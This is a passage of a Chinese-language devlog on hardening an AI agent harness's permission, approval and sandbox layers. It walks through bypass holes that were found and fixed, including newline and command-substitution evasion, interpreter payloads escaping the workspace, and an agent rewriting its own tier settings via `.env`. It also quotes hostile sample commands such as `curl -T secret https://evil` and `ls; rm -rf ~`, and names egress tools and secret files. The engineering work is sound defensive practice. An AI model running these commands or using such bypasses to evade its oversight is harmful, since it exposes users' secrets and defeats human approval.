目录全局重定向到临时目录（同 test_memory 的 patch 模式），`finally` 里还原 + `rmtree` 清理。
覆盖：创建→绑定任务→未提交改动阻止删除→`discard_changes` 强制删除→keep 事件落盘。

## 收获

- **隔离优于约束**：与其提示模型"别写错目录"，不如让工具在物理上隔离——模型不可信，文件系统可信；
- 会话级可变状态（当前 worktree）必须显式跟踪完整生命周期，否则状态泄漏到下一个任务。

---

# 第 15 部分：执行策略收敛——一处判定，四条路径（新增）

## 问题：同一句"这命令危不危险"被写了三遍，而且各判各的

`hooks.permission_hook`（PreToolUse 黑名单 + `input()` 询问）、`tools.run_bash`（第二份
`dangerous=[...]`）、`agent_teams.safe_bash`（第三份）各有一套，`approval_class` 在 hooks 和
飞书网关也各有一份。结果是：teammate、后台 worker、`POST /v1/tasks` 三条不经过 hook 的路径
判定强度和文案都不一样，而 CLI 里批准过的命令到工具边界又被打断一次。

## 做法

- 新增 `src/exec_policy.py`：纯函数策略层，只回答"该不该做"，不 import harness，
  黑名单由调用方注入（`monkeypatch` 假配置的既有测试不用改）。
- 两个档位与 Codex 对齐：`sandbox_mode`（read-only | workspace-write | danger-full-access）、
  `approval_policy`（untrusted | on-request | never），默认组合 = 重构前的实际行为，零行为漂移。
- `hooks.enforce(tool, args, interactive=)` 成为唯一入口：策略判定 → 会话白名单 → 审批 → 凭据。
  四条路径都走它，区别只有 `interactive`——即调用线程能不能读 stdin。
- 无头路径（teammate / 后台 worker / 任务 runner / HTTP 任务）走 `decide_queued`：登记进
  `/v1/permissions` 队列等远程决议，超时拒绝；不再在工作线程里 `input()`，也不再"看不见就放行"。
- 审批通过发一张一次性凭据（`ContextVar`），工具边界取走即用，同一次调用不会问第二遍；
  跨线程要像 `use_workspace` 那样显式带走。

## 踩过的坑

- **审批白名单是进程级集合**：一个会话批过 `rm`，别的会话也免审。改成按
  `session_allow_key(tool, klass, session_id)` 分区；取不到会话时退回旧的进程级键，
  既有测试（假配置没有 `active_checkpoint_manager`）行为不变。
- **"越界访问"是个不起作用的按钮**：策略层问一次"要不要访问工作区外"，用户批了，
  `safe_path` 照样拒绝。改成直接硬拒，确需越界切 `danger-full-access`。
- **档位名大小写不一致**：`command_error` 用 casefold 校验通过，`apply_sandbox_tier` 却按原样
  比较 `parts[0] == 'approvals'`，于是 `/sandbox APPROVALS never` 会当成执行档位名去校验并抛错。
  分支判定也要归一。
- **新档位差点又变成一个不起作用的按钮**：`danger-full-access` 最初只改策略层判定，
  `tools.safe_path` 仍无条件拒绝越界路径——档位写了却不生效。路径检查也要读档位
  （默认两档锁工作区，`danger-full-access` 放开），两处不能给出相反结论。
- **拒绝语文案是对外契约**：`'Permission denied by user'`、
  `'Error: Dangerous command {pattern}, please do not execute'` 被提示词规则和历史测试断言，
  重构时先固定文案再动逻辑。
- **`read-only` 档的短路顺序**：`never` 的含义是"别问我要不要"，不代表"允许"，
  所以 read-only 档下的询问在 `never` 时必须变成硬拒，否则配了只读档反而更松。

## 测试

`test_exec_policy.py`（判定矩阵：默认档等值、绕过语料、三档差异、配置解析与告警）+
`test_execution_paths.py`（凭据只消费一次、无头排队与超时、白名单分区、四条入口边界、`/sandbox`），
`test_task_manager.py` 补 enforce 回调，`test_harness_api.py` 补 `/v1/policy` 与任务被档位拦下，
`test_feishu_gateway.py` 补网关档位读写。全量 474 passed。

## 收获

- **安全边界的价值在于"只有一处"**：判定重复三遍时，最弱的那条路径就是实际边界；
- 新配置项必须有真实区别和显式失败：静默回落默认值等于骗用户"保护开了其实没开"；
- 无头线程的审批要"排队 + 超时拒绝"，既不能抢控制台，也不能悄悄放行。

## 问题：收敛入口之后，文本判定仍有可绕过的边角

P0 把判定收敛到一处，但"一条命令危不危险"仍靠文本分析。验收语料又发现三类漏判：

- **换行不分段**：POSIX shell 把换行当命令分隔符，`dir\nsudo whoami` 却只被看成 `dir`，
  硬黑名单和 `read-only` 白名单都能被第二行绕过。分段正则补 `\r\n|\n|\r`；
  Windows cmd 不执行第二行，但判定按最坏情况处理，不依赖平台差异。
- **命令替换不透明**：`echo $(sudo whoami)`、PowerShell `Write-Output $(shutdown /s)`
  只解析到 `echo`。识别到 `$(` / 反引号就按 opaque 询问；不做嵌套解析，宁可多问一次。
- **只读命令的参数也能写**：`git diff --output=file`、`date -s`、`hostname NAME`
  在子命令层面看不出来，但都会改状态。白名单收紧到参数级。

同时把 `never` 改为 fail-closed：Codex 敢在 `never` 下放行，是因为 workspace-write 有
OS 沙箱兜底；Stage 1 没有，于是"不问"只应是"失败"，而不是"静默执行 `rm -rf`"。
`danger-full-access + never` 保留完全自主，全权档是用户显式承担风险的入口。

审批面也做了压缩：`write` 的 content 可能有几十 KB，不再整份塞进控制台、`/v1/permissions`
和审批历史；长字符串截到 200 字符并标注原长度，嵌套容器限深限量。

## 测试

`test_exec_policy.py` 补换行、命令替换、只读参数级语料；`test_execution_paths.py` 补审批参数
压缩；`never` 用例改写为 fail-closed。全量 489 passed。

## 收获

- **"命令名只读"不等于"这次调用只读"**：白名单要看到参数和每一段命令；
- **没有沙箱的 never 是自欺**：不问就必须拒绝，不能让"省事"悄悄变成"无保护"。

---

# 第 16 部分：审批的两处洞——客户端 klass 与第三方工具（新增）

## 问题：闸门收敛之后，剩下的洞在"信任边界"上

Stage 1/2 把判定收敛到一处、把 `never` 改成 fail-closed、加上了 OS 沙箱之后，review 发现
两个洞都不在判定逻辑里，而在"谁说的话算数"上：

- **审批决议接受客户端 `klass`**：`POST /v1/permissions/{id}/resolve` 把调用方传来的
  `klass` 直接写进会话白名单。审批人看到的是一条 `del`，请求体里多带一个 `klass=rm`
  就能给后续所有 `rm` 开门——被审批的内容和登记的白名单可以不一致。
- **第三方 MCP 工具完全不经过策略层**：`register_mcp_tools` 把工具塞进 `tool_registry`，
  于是 hook 认得它；而 `Policy.evaluate` 对"不认识的工具名"一律 ALLOW。MCP 工具能写盘、
  能发 HTTP，read-only 档下也是直接执行——README 当时把它记作已知边界（P0.2）。

## 做法

- `PermissionGate.resolve` 去掉 `klass` 形参：同类键改用 `approval_class(req.tool, req.args)`
  在决议时重算。调用方只能表达"允许吗、要不要扩到同类"，不能表达"扩到哪一类"。
  API 模型、`gateway_sim`、飞书卡片 value 同步删掉这个字段；卡片按钮文案仍显示同类，
  但那只是给人看的提示（同一个函数算的），不再是决议输入。
- `Policy.evaluate` 新增 `external_tools` 入参（与 `deny_list` 同构，由调用方注入）：
  名单里的工具一律 ASK，落在 `_apply_approval_policy` 之后 → `never` 依旧 fail-closed，
  只有 `danger-full-access + never` 放行。名单由 `hooks.EXTERNAL_TOOLS` 持有，
  `harness.initialize_mcp_tools` 注册 MCP schema 时登记。
- 免审的出路复用既有机制：第三方工具的 `approval_class` 就是工具名，
  点一次"本次会话允许同类"，同会话内该工具不再重复问。
- **顺手补齐 CLI 的第三个按钮**：卡片一直有"允许同类"，CLI 的 `input()` 只有 y/n，
  第三方工具默认每次询问会把 CLI 用户问烦。`_decide_console` 增加 `a`，
  并且改为调用 `self.resolve(...)` 决议（与远程同一条路径），不再自己写 status——
  少一处状态写入点，白名单推导逻辑也就只有一份。
- 分支顺序保证内置规则优先：`bash`/文件/worktree 判定在 `external_tools` 之前，
  名字撞车也不会改写既有判定。

## 踩过的坑

- **发卡时算一份、决议时算一份**：`approval_class` 曾在网关和服务端各算一次，注释里写的是
  "两处必须同规则"。真正的修法是不让网关算——决议时按登记的 tool/args 算一次，
  展示要用的话自己算着玩，不进请求体。
- **`compact_args` 截断会不会影响同类判定**：不会。摘要只截长字符串的尾部，
  bash 的首词、非 bash 的工具名都在头部，决议与发卡拿到的 class 一致。
  （第 17 部分把命令摘要改成「留头尾」，这条结论仍然成立，而且是被测试钉住的。）
- **旧卡片还在飞书里**：删掉模型字段后 pydantic 忽略多余键，历史卡片带 `klass` 照样能点，
  不需要迁移。
- **`EXTERNAL_TOOLS` 是进程级集合**：测试里注册一个 `mcp_echo` 会泄漏给后面的用例，
  让某个同名工具莫名要审批。conftest 按用例存取还原（与审批后端隔离同一个 fixture）。

## 测试

`test_exec_policy.py` 补第三方工具档位矩阵（三档都问、`never` 拒绝、
`danger-full-access + never` 放行、未登记工具行为不变、名单不遮蔽内置判定）；
`test_execution_paths.py` 补闸门接线（登记后询问、白名单按工具名免审、`never` 不产生请求）；
`test_approval_scope.py` 补"同类键来自被审批内容"与 HTTP 层忽略客户端 `klass` 的契约用例；
`test_mcp_adapters.py` 补注册即登记为第三方工具；`test_permission_gate.py` 补 CLI `a` 与
`y` 只差一个会话白名单键。全量 517 passed。

## 收获

- **审批接口只能接受"意图"，不能接受"结论"**：让客户端传分类键，等于把判定的最终解释权
  交出去；被审批的内容本身才是唯一可信输入。
- **"策略层不认识"不等于"没有副作用"**：工具集合会由第三方在运行时扩充，默认放行就是把
  未知当成安全；正确默认是"不认识就先问"，再给一条明确的免审路径。

---

# 第 17 部分：审批面的五个洞——从"看得见"到"按会话算数"（新增）

## 问题：判定收敛之后，剩下的问题是"人在这一步到底掌握了什么"

第 16 部分补的是信任边界。review 之后还剩五条，都不在判定逻辑里，而在审批这一层
实际生不生效上：

- **审批面看不到要批准的东西**：参数摘要一刀切 200 字符，飞书文案又在网关再切 160。
  `echo … | tee ~/.bashrc` 里真正危险的正好是被切掉的尾部；命令文本直接 print，
  里面的 ESC/CR/BEL 会被终端解析，等于被审批的字符串能反过来改写审批提示。
- **无头路径把会话丢了**：`ContextVar` 不随 `threading.Thread` 继承，teammate 与后台
  worker 里 `current_session_id()` 拿到空串 → 白名单退回进程级键 `bash:rm`。
  "按会话分区"恰恰在最需要它的两条路径上没生效。
- **同类键粗到覆盖整个包装器**：`cmd /c "del x"` 归类成 `cmd`，点一次"允许同类"
  把 `cmd /c rd /s /q build` 一起免审了。
- **untrusted 档能被一次预授权改掉**：白名单短路在档位判定之后、问人之前，
  所以"每条都问"的档位里点一次 `a` 就退化成 on-request。
- **审批超时配置在 import 时崩**：`float(os.getenv(...))` 遇到
  `HARNESS_APPROVAL_TIMEOUT=5m` 直接抛 ValueError，整个 CLI 起不来；`0`/负数则
  静默地把所有审批变成秒拒。

## 做法

- 新增 `src/approval_view.py`，把两个时机分开：登记时的 `summarize(tool, args)` 决定
  审批历史/API/卡片里的参数上限，展示时的 `detail(tool, args)` 决定人看见什么。
  命令按「留头 1200 / 留尾 400 / 中间省略 N 字符」摘要，其余字段仍限长（`write` 的
  整份 content 不该进审批历史）。四个展示位（CLI 提示、`/approvals`、`/perms`、
  审批卡片代码块）都改为调用同一份渲染，网关不再自己截断；`safe_text` 把 C0
  （tab、换行除外）与 DEL 换成 `\xNN` 可见写法。
- `hooks.use_session(session_id)` 与 `use_grants` 同构：派发线程读一次
  `current_session_id()`，在 worker 里显式包住执行体（`background_task`、
  `agent_teams.spawn_teammate_thread`）。`current_session_id()` 先读显式值，再回落
  checkpoint manager 的绑定，所以主循环不必额外接线。
- `approval_class` 解一层包装器（复用策略层已有的 `_WRAPPERS` / `_WRAP_FLAGS`），
  命令名统一走 `_basename`：绝对路径、`.exe`、大小写都归一到同一个键。
  解释器载荷（`python -c`）不解——它的第一个词是 `import`，当同类键没有意义。
- `enforce` 持有本次判定的 `Policy` 快照（`evaluate_call(..., policy=)`），
  `untrusted` 档跳过白名单短路；档位语义只在一个地方兑现。
- `approval_timeout()` 解析配置：非数字与 ≤0 都在 stderr 提示后按默认 300s，
  不再在 import 时抛；`GATE.timeout` 仍是普通属性，长驻服务运行时直接改即刻生效。

## 踩过的坑

- **repr 早就"顺手"转义了**：旧代码 print 的是 `{req.args}`，dict 的 repr 会把
  `\x1b` 写成可见字符，所以注入问题一直没暴露。改成"命令单独成段"之后必须显式转义，
  这正是把展示逻辑抽出来的理由。
- **摘要规则与同类判定互相制约**：只留尾部会让 `approval_class` 算错，只留头部会把
  重定向目标切掉。"留头尾"是唯一同时满足两边的规则，测试直接钉住这条约束
  （摘要后重算仍是 `rm`）。
- **测试假 harness 把会话挂在类属性上**：`Config.session_id` 是进程级的，新线程照样
  读得到，于是"带不带会话"的用例怎么改都能过。改成在派发线程用 `use_session` 造上下文，
  用例才真的抓到漏带——去掉 carry 后 `test_background_worker_carries_the_dispatching_session`
  确实失败（验证过）。
- **teammate 用例的假 manager 是一个裸 `object()`**：它只想验证"checkpoint 不跟过去"，
  结果 `current_session_id()` 读 `.session_id` 就炸。换成带 session_id 的假 manager，
  顺便让这个用例同时证明"会话要跟过去、checkpoint 不跟"。
- **`_wrapped_verbs` 顺带改严**：抽 `_wrapped_tokens` 时把"只看标志位后第一个 token"
  改成"看整段载荷"，`cmd /c "dir && del x"` 内层第二个命令名现在也看得见。
  方向是变严（多问一次），不会让既有黑名单漏网。

## 测试

`tests/test_approval_view.py` 新增（命令留头尾、控制字符转义、多行渲染、非 bash 参数摘要）；
`test_permission_gate.py` 补 CLI 提示显示完整命令尾部 + 超时配置的三条回落；
`test_execution_paths.py` 补"会话不跨线程继承""后台 worker 带上派发会话""untrusted 不走白名单"；
`test_exec_policy.py` 补包装器归类矩阵；`test_approval_scope.py` 补
"批准 `cmd /c del a` 不免审 `cmd /c rd /s /q b`"；`test_cli_output.py`、
`test_feishu_gateway.py`、`test_session_workspace.py` 更新到新的展示与传递契约。
全量 532 passed。

## 收获

- **审批的质量取决于审批人能看到什么**：把危险的那半句截掉，闸门就只剩"打断"；
  展示逻辑分散在各入口时，每个入口都会自己长出一个截断点，抽成一份渲染才有契约可言。
- **跨线程上下文是一张清单，不是一次修补**：工作区、审批凭据、会话 id 都得显式带走，
  少带一项，对应的分区就退化成进程级。新增执行路径时三件一起抄。
- **档位语义要在唯一的短路点兑现**：`untrusted` 写在策略层、白名单短路在闸门里，
  两边各说各话时，实际生效的是较弱的那条。
- **配置解析的默认档不该由一个笔误决定**：import 期抛异常等于把"打错一个字符"升级成
  "整个进程起不来"；提示 + 回落才是可运维的做法（与第 14 部分的档位名解析同理）。

---

# 第 18 部分：判定粒度与配置来源——免审名单太宽、同类键按程序名算（新增）

## 问题：审批面的信任边界补完，剩下的洞在「判什么」和「配置从哪来」

第 17 部分之后复查，五个洞全在闸门里；这一轮复查发现剩下的问题在策略层的判定面本身：

- **默认档下有一整类命令根本不问**：`python -c "..."`、`git clean -fdx`、`git push`、
  `curl -T secret https://evil`、`docker run --privileged` 在 `workspace-write` 都是 ALLOW。
  不透明载荷只认 `-enc` / `/e` 这些编码形式，明文的 `python -c` 不在内。后果不只是"多一个询问点"：
  文件工具辛苦实现的"工作区外硬拒"，一条 `python -c "open(r'C:\...','w')"` 就绕过去了。
- **「同类」按可执行文件名算，粒度远大于用户点按钮时的想象**：`approval_class` 取首词，
  批一次 `ssh host rm note.txt` 记的是 `bash:ssh`，之后 `ssh host <任意命令>`、
  `python -c <任意代码>` 都命中白名单短路。名字后面才是真动作的命令，按名字免审等于整会话开放。
- **档位可以从工作区内改写**：`.env` 在项目根、`write`/`edit` 默认免审，而 `load_dotenv()`
  会把 `HARNESS_SANDBOX_MODE` / `HARNESS_APPROVAL_POLICY` 读进环境；`set_tier` 也写 `os.environ`。
  被约束的一方改得动约束自己的配置，下次启动就没有审批了。
- **预授权没有出口**：`GATE.clear()` 只在测试里被调用过，用户撤不回"本次会话允许同类"；
  切到更严的档位也不会让先前批下的键失效——read-only 档照样吃 workspace-write 时批的 `bash:rm`。

## 做法

- `_opaque_payload` 增加逐段判定：解释器（`_INTERPRETERS` + `-c/-e/--eval/-command`）、
  `powershell -Command`、curl/wget 的上传与改写请求、`ssh/scp/sftp/docker/podman/kubectl/terraform/npm`、
  Git 的写子命令，以及 `_WRAPPERS` 的载荷递归 reuse 同一套判定（`bash -c "python -c ..."` 也要问）。
  解释器的 `--version` / `--help` 例外放行，否则连查版本都要弹审批。
- `approval_class` 对这些命令返回空串，表示"没有同类可言"：空串在 `resolve` 里不写白名单，
  审批卡片隐藏"允许同类"按钮，CLI 也不再显示一个不起作用的 `a`（第 17 部分刚批评过这个反模式）。
  Git 例外——它的子命令本身就是语义单位，所以 `git status` 的键是 `status`，
  `git push`/`clean`/`reset` 等写子命令才返回空串。
- 档位的来源收紧到"启动进程时的真实环境"：`harness` 在 import 的最开头快照三个档位键，
  `load_dotenv()` 之后由 `enforce_trusted_policy_env()` 恢复或剔除，`.env` 提供的档位一律无效，
  并在 stderr 说明"已忽略配置文件里的 HARNESS_*"——旧 README 教人把档位写进 `.env`，
  静默失效会让人以为开着 read-only 其实跑的是默认档，那是一次反向的静默降级。
  快照必须放在 harness 顶部而不是 `exec_policy`：`agent_teams` 在模块层就调 `load_dotenv()`，
  而它在 `exec_policy` 之前被 import，晚一步快照就等于把 `.env` 的值当成可信环境。
- 加 `/revoke`（CLI、飞书、`POST /v1/permissions/revoke`）撤销当前会话预授权；
  换档（`/sandbox`、`/v1/policy`）本身当作一次安全状态变更，连带撤销全部会话的预授权，
  重复设同一档位不触发。

## 踩过的坑

- **改动落地时全量挂了 2 条**：`/revoke` 插进斜杠补全的 `/r*` 期望列表；
  `test_shell_timeout_...` 用 `python -c "import time; time.sleep(3)"` 制造慢命令，
  现在这条命令要审批 → 无头路径超时 → 断言拿到 `Permission denied by user` 而不是 `timeout`。
  后者不是测试写错，是测试的前提变了：显式切到 `danger-full-access` 让它继续只测超时回收。
- **`_NO_SESSION_GRANT` 与询问名单不必一一对应**：`pip` / `uv` / `npx` / `git-lfs` 只拒绝免审，
  在默认档仍不问。前者是"哪些名字不能被整会话开放"，后者是"哪些动作要问"，两件事分开写清楚，
  不然会误以为 `pip install` 已经在询问面里。
- **只读子命令一起挨问**：`docker ps`、`kubectl get pods`、`ssh host uptime` 现在每次都问。
  判定层不解析这些工具的子命令语义，要区分就得给每个工具维护一份只读子命令表；
  先按"宁可多问一次"落地，代价在 README 里明写。
- **`setx` 仍是开放路径**：真实用户级环境是可信来源，`setx HARNESS_APPROVAL_POLICY never`
  在默认档不问（`reg add`、`[Environment]::SetEnvironmentVariable` 同理）。这一条留给下一轮。
- **CLI 的 `a` 差点变成一个不起作用的按钮**：卡片按 `klass` 隐藏了"允许同类"，
  而 `input()` 的提示文案是写死的，照样显示 `a=`——点了以为买了整会话免审，其实只放了这一次。
  改成按 `klass` 生成提示，真按 `a` 也明确回一句"这类命令不记同类"。

## 测试

`test_exec_policy.py` 增加解释器/外发/包装器询问矩阵与 Git 子命令归类；
`test_approval_scope.py` 增加"敏感命令点了同类也不写白名单"与 `revoke_session` 按会话精确撤销；
`test_execution_paths.py` 增加换档撤销预授权、重复换档不撤销、`.env` 不是档位来源（且不静默失效）；
`test_permission_gate.py` 增加 CLI 对无同类命令隐藏 `a`；
`test_harness_api.py` 的三个 OS 任务用例补"任务命令先等一次远程审批"；
`test_cli_input.py`、`test_turn_progress.py` 的前提随判定面变化一起更新。全量 551 passed。

## 收获

- **免审粒度必须不宽于用户点按钮时看到的范围**：审批提示显示的是一条完整命令，
  白名单却按程序名记，两者的差值就是洞。要么把键收窄（子命令级），要么取消这一类的免审出路。
- **安全配置不能放在被约束者可写的位置**：工作区内的 `.env`、可持久化的用户级环境变量都是
  "被保护方改写保护者"的入口；来源收紧成"进程启动环境"之后，模型能改的东西不再影响档位。
- **状态变更要有对称的撤销口**：给了"允许同类"就得给 `/revoke`，给了换档就得让换档作废旧预授权，
  否则权限只增不减，档位切换看起来安全其实不清账。

---

# 第 19 部分：读写分区——只读放开、越界写审批、秘密文件硬拒（新增）

## 问题：文件工具的边界和机器的实际能力对不上

- bash 早就 `cat` / `type` / `findstr` / `curl` 读任意路径，默认档全放行；`read` 工具却在工作区外
  直接硬拒。同一台机器两套事实，文件工具的禁令只是把正常用法赶回 shell。
- 越界写更别扭：旧实现先弹一次「越界访问」，批准后 `safe_path` 仍然拒绝——一个不起作用的按钮。
- `.env`、`~/.ssh/id_rsa`、`*.pem` 通过 `read` 读不到，但 bash 一条 `cat` 就能读；文件层的秘密
  保护没有对应的 shell 约束，说它是边界并不成立。
- 文件审批的「同类」键是工具名：批一次 `write`，整会话所有路径的写入都免审。读放开、越界写
  可批准之后，这条会把路径边界整个绕过去。

## 做法

- `exec_policy.classify_path` 把路径分成五区：`workspace` / `outside` / `secret` / `system` /
  `invalid`。先 `resolve` 再判定，junction/symlink 指到哪就算哪；`~` 展开；空字节、链接环归为
  `invalid`，由策略层拒绝，而不是让 hook 抛异常打断整轮对话。
- 文件工具的策略矩阵：秘密文件读写都硬拒（`danger-full-access` 也不放开）；系统目录
  （`C:\Windows`、`Program Files`；POSIX 的 `/etc`、`/usr` 等）默认档只读、写改硬拒，
  `danger-full-access` 放开；读在工作区外也放行；`read-only` 档的写改询问；默认档工作区外
  写改询问；工作区内写改放行。`invalid` 直接拒绝。
- `resolve_tool_path` 由 `hooks._path_zone` 与 `tools.safe_path` 共用。`safe_path` 不再做第二次
  边界判断——批准后必须写到卡片上显示的路径；`run_read` 补上 `_gate_file`，让 teammate 这类
  无头路径也有秘密文件闸门。
- 文件工具的 `approval_class` 返回空串，不提供「本会话允许同类」；凭据键加入 cwd，worktree 里的
  `a.py` 不能消费主工作区同名路径的批准。
- 秘密名单继续用 `checkpoints.DEFAULT_SECRETS`（`.env` / `*.pem` / `*_rsa`），由 hooks 传入，
  不另起一份。

## 踩过的坑

- **测试夹具只 patch 了 `hooks._h`，没 patch `tools._h`**：策略层按临时工作区判「越界」，`safe_path`
  却按真实工作区解析，第一次跑测试真的在 `D:\outside.txt` 写了一个文件。两个入口的解析必须
  是同一个函数，测试也必须让两边看到同一个工作区。
- **读的闸门原本只在 PreToolUse**：读放开以后，秘密文件如果只靠 hook，teammate / 后台调用会绕过。
  边界上的 `run_read` 必须自己判一次，和 `run_write` 的老做法一致。
- **文件工具不能留「同类」**：越界写每批一次就应只放这一次；否则目录范围授权还没做，先有了
  无范围的整会话写入。范围键（目录/origin）留到后续，不拿工具名凑数。
- **`.env` 硬拒会挡住正常改配置**：这是刻意的第一版取舍——先保证不会被静默读取；真要改，
  可以让用户在 Agent 外改，或后续加「一次性批准、不记同类」的项目秘密档。
- **`danger-full-access` 不放开秘密文件**：这是数据保护，不是工作区约束。用户选的是「不限制
  工作路径」，不是「可以把私钥发出去」。
- **`path_zone` 的默认值不能是 workspace**：漏传分类的调用会因此静默放行写入。默认改成
  outside，忘记分类时最坏也只是多问一次。

## 测试

`test_exec_policy.py` 增加路径分区矩阵（读越界放行、写越界询问、秘密三档全拒、invalid 不抛异常）、
`classify_path` / `resolve_tool_path` 的解析与大小写用例；
`test_execution_paths.py` 增加越界写批准后落盘、拒绝后不落盘、越界读免审、秘密读写不产生审批请求、
full-access 仍拒秘密；`test_approval_scope.py` 与 `test_exec_policy.py` 更新文件工具无同类键、
凭据带 cwd。全量 569 passed。

## 收获

- **边界要和实际能力对齐**：bash 已经能读，文件工具的「硬拒」只是把正常用法赶进 shell；把两套
  判定收进同一个 `classify_path` 之后，秘密保护才有一个可解释的位置。
- **审批按钮必须能兑现**：越界写不再「先问后拒」；批准后的写入路径必须和卡片上显示的一致。
  同一个解析函数是这句话的实现，不是注释。
- **读放开的前提是出口和秘密区**：入口全开时，边界移到「写/发」和少数秘密文件上。下一步联网
  必须先接好出口审批，否则「读任意文件 + 能发任意请求」就是一个完整的 exfiltration 通道。
- **硬拒不是越多越好**：`.env` 这类项目秘密挡的是正常工作流；第一版先保证不静默读取，后续再给
  一次性批准的口子，别把「安全」做成逼用户关掉审批的摩擦。

---

# 第 20 部分：补齐检索工具——grep / ls 与 glob 根路径（新增）

## 问题：文件工具只有读、写、改、glob

`grep`、列目录都没有对应工具，模型只能退回 bash：绕过了并行只读批次、路径分区与输出截断，
在 teammate 的 worktree 里还容易搜错目录。`glob` 也只能搜工作区，读已经放开之后这一限制没有理由。

## 做法

- 新增 `run_grep`（正则、glob 过滤、大小写、结果上限）与 `run_ls`（目录/文件信息，隐藏项需
  `all=True`）；`run_glob` 增加 `path` 根路径与 `cwd`，三者都可指向工作区外。
- `exec_policy.READ_ONLY_FILE_TOOLS` 把 read / glob / grep / ls 收进同一分区判定：秘密路径与
  invalid 路径硬拒，其余读放行；`hooks.evaluate_call` 对缺少 `path` 的检索工具按工作区判定。
- 边界仍各自判一次：`_search_root` 走 `_gate_file('read', ...)`；grep 遍历目录时按最终目标
  跳过秘密文件（包括链接到 `.env` 的别名），并跳过 `.git`、`.cache`、`node_modules` 等目录。
- 二进制与超过 2 MB 的文件不搜；匹配行截断到 400 字符；结果默认上限 100 行并显式标注截断。
- teammate 的 glob/grep/ls 统一包一层 `_wt_cwd()`，与 bash/read/write/edit 一样在 worktree 内执行；
  三个工具加入 `PARALLEL_SAFE_TOOLS`。
- 顺手把控制台诊断里的 `⛔` / `⚠` 换成 ASCII 前缀：GBK 控制台打印这些字符会抛
  `UnicodeEncodeError`，一条本应拒绝的命令反而把整轮对话打断。

## 测试

新增 `test_file_search.py`：grep 行号/glob 过滤/大小写、秘密与忽略目录跳过、显式秘密路径拒绝、
非法正则、结果截断、ls 隐藏项、glob 外部根路径、cwd 透传、teammate worktree 作用域；
`test_exec_policy.py` 补充三个只读工具的路径矩阵与三档秘密拒绝。全量 587 passed。

## 收获

- **只读工具也是读**：read 上的秘密硬拒如果不覆盖 grep，就等于没做；搜索工具必须在打开文件前
  按最终目标过滤，而不是搜到内容后再判断。
- **工具要跟着工作区走**：teammate 的 cwd 不是 ContextVar，而是显式包装参数；新增工具漏掉这层，
  就会在主工作区里搜，结果看起来正常但对象错了。

---

# 第 21 部分：飞书身份闭环与审批归属（新增）

## 问题：谁能用、在哪用、替哪个会话批，三件事都没闭环

- `main()` 在 `FEISHU_ALLOWED_USERS` 缺失时只打印警告就启动；机器人背后是真实 shell，
  "没配置"等于"任何人可达即可用"。
- 网关处理所有来源的消息，包括群聊；个人助手的场景里没有群聊，群成员却能触发会话。
- `poll_permissions` 把每条 pending 请求广播给**所有**已绑定聊天。A 会话的审批会出现在
  B 聊天（甚至群聊）里，任一聊天都能替它决议。
- 审批卡片和 `/approve <req_id>` 只要拿到 id 就调 resolve，不检查该请求是否推送给本聊天；
  `/perms` 也列出全部待审批请求，同样跨会话泄露操作内容。
- `dispatch` 只把 `(chat_id, text, sender_id)` 交给 worker，`on_lark_message` 拿到的
  `message.chat_type` 在入队时被丢掉；即使入口想按来源过滤，worker 里也看不到了。

## 做法

- `main()` 改为 fail-closed：缺 `FEISHU_ALLOWED_USERS` 直接退出并给出配置提示；本地测试
  用 `FEISHU_ALLOW_ANY_USER=1` 显式放开，启动日志分别打印白名单与"仅单聊"状态。
- `on_message` 新增 `chat_type`：真实事件只放行 `p2p`，`group`/`topic` 在用户白名单判定
  之前就静默忽略；`None` 保留给测试和 `gateway_sim`。`on_lark_message → dispatch →
  dispatcher → on_message` 全链路带上来源（队列项从三元组改为四元组）。
- `poll_permissions` 按登记时的 `session_id` 路由：只推给绑定该会话的聊天。没有会话上下文的
  请求（后台任务、任务 runner）继续广播给所有绑定聊天，因为它们的归属只有"谁收到谁批"。
- `/perms` 同样按当前绑定过滤，并用过滤后的列表重建本聊天 FIFO，保证显示序号与 `y2/n2`
  解析的是同一组请求。
- 审批卡片和 `/approve <req_id>` 都要求 `req_id` 在本聊天的 FIFO 中；跨聊天直接拒绝并提示
  `/perms`。网关重启后旧卡片会失败关闭，用户重新 `/perms` 即可恢复，不靠"id 看起来对"放行。

## 测试

`test_feishu_gateway.py` 新增：群聊/话题群忽略、`dispatch` 透传 `chat_type`、
审批只路由到绑定会话、`/perms` 跨会话不可见、卡片与 `/approve <id>` 跨聊天被拒、
缺少白名单拒绝启动与显式放开路径。网关与会话并发测试 43 passed。

## 收获

- **广播不是送达**：把审批发给所有人，再由"谁先看见"决定归属，等于把授权边界交给分发逻辑。
  审批必须先回答"这个请求属于哪个会话"，再回答"哪个聊天绑定它"。
- **按钮是能力，不是入口**：req_id 可猜不可怕，可怕的是持有 id 就能越过聊天归属；决议前必须
  回到"这条请求是否推送给当前聊天"这一事实。
- **身份要三件事同时说清**：谁能用（用户白名单）、在哪用（只收 p2p）、替哪个会话批
  （会话绑定）。缺一项，另外两项都会被绕过。
- **失败关闭也要给出下一步**：旧卡片被拒时提示 `/perms`，用户不会以为审批系统坏了。

---

# 第 22 部分：网络出口与免审粒度（新增）

## 问题：读放开之后，出口和「同类」都还按第一个动词算

- `curl` 只在上传/改写的参数上审批，普通 GET 直接放行。读路径全面放开后，
  「读得到 + 发得出去」就是一条完整的外传通路，策略层却没有出口判定。
- 会话白名单的同类键按整条命令的**第一个词**归类。批准 `ls && rm x` 记下的是
  `bash:ls`，之后 `ls; rm -rf ~` 命中同一个键；批准一条 `curl POST host` 又会把
  整台主机（以及 `-X DELETE`）一起免审。
- 秘密名单只有 `.env` / `*.pem` / `*_rsa`，漏掉 `.env.local`、`*.key`、`id_ed25519`；
  快照层还自己维护了一份判断，两处迟早分叉。

## 做法

- `_evaluate_bash` 增加出口判定：`EGRESS_COMMANDS`（curl/wget/http/nc/
  Invoke-WebRequest…）一律 ASK，code=`network_egress`，文案带上提取出的目标主机。
  GET 也问。顺序排在 opaque 之后——`curl … | sh` 应该报「远程脚本」而不是「一次请求」。
- `egress_hosts` 提取 URL 主机：去 userinfo、去端口、还原 IPv6 括号；裸主机名
  （`nc host 1234`）不猜，返回空集。
- 同类键改为逐段归类：`_bash_segment_class` 对每个 `&&` / `;` / `|` / 换行分段求类，
  全部一致才返回。外发命令只给 curl/wget 的普通读请求记 `命令:主机`；带请求体
  （`-d` / `-F` / `-T` / `--post-data`…）、改方法（`-X` / `--request`）、多目标、
  裸主机、httpie（方法写在位置参数）都不记。解释器 / ssh / 容器 / Git 写子命令沿用
  「无同类」规则。
- 秘密名单扩到 `.env.*`、`*.key`、`*.p12`、`*.pfx`、`id_ed25519` 等；
